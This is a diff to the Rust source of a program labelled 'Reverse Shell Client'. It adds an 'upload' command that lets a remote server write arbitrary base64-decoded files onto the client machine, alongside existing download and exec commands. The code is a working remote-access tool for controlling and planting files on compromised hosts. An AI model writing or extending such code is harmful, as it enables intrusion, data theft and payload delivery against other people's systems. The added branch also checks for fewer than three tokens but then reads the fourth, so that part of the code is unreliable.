@@ -4,7 +4,8 @@ use std::process::{Command, Output};
 use std::borrow::Cow;
 use clap::{Arg, Command as ClapCommand};
 use std::fs::File;
-use std::process;
+use std::path::Path;
+
 
 fn executecommand(cmd: &String) -> String{
 
@@ -52,7 +53,7 @@ fn main() {
 
      // CLI arguments.
      let matches = ClapCommand::new("Reverse Shell Client")
-        .version("0.10")
+        .version("0.11")
         .author("Duane Dunston <thedunston@gmail.com>")
         .about("Reverse Shell Client")
         
@@ -112,7 +113,7 @@ fn main() {
         let _ = tcpstream.write(msg.as_bytes());
 
         // Receive data from server.
-         let  bufreader = BufReader::new(&tcpstream);
+         let  _ = BufReader::new(&tcpstream);
     
         // Clone the stream for reading and writing.
         let tcpstream_read = tcpstream.try_clone().expect("Failed to clone stream for reading");
@@ -146,7 +147,7 @@ fn main() {
             
             }
 
-            // First token is the command (download/exec) used to determine what to do.
+            // First token is the command (download/exec/upload) used to determine what to do.
             let srv_cmd = tokens[0];
 
             match srv_cmd {
@@ -182,6 +183,44 @@ fn main() {
                     // Send a null-terminal character to the server to indicate the end of sending the file contents.
                     tcpstream_write.write_all(b"\0").unwrap();
                 
+                }
+
+                "upload" => {
+
+                    // Debug.
+                    println!("Uploading file from server.");
+
+                    if tokens.len() < 3 {
+            
+                        // Send an error message to the server.
+                        tcpstream_write.write_all(b"Error: No filename provided for upload.\0").unwrap();
+                        continue;
+            
+                    }
+                    let remote_file = tokens[1];
+                    
+                    // base64 decode the file contents.
+                    let file_contents = base64::decode(tokens[3]).unwrap();
+                    
+                    // Write the file contents to a file on the client.
+                    let mut file = File::create(&remote_file).unwrap();
+                    file.write_all(&file_contents).unwrap();
+
+                    // Send a null-terminal character to the server to indicate the end of sending the file contents.
+                    tcpstream_write.write_all(b"\0").unwrap();
+
+                    // Check if the file exists and send successful message or an error message.
+                    if Path::new(&remote_file).exists() {
+                    
+                        // Send a successful message to the server.
+                        tcpstream_write.write_all(b"File uploaded successfully.\0").unwrap();
+                    
+                    } else {
+                    
+                        // Send an error message to the server.
+                        tcpstream_write.write_all(b"Error: File upload failed.\0").unwrap();
+                    }
+                    
                 }
 
                 "exec" => {
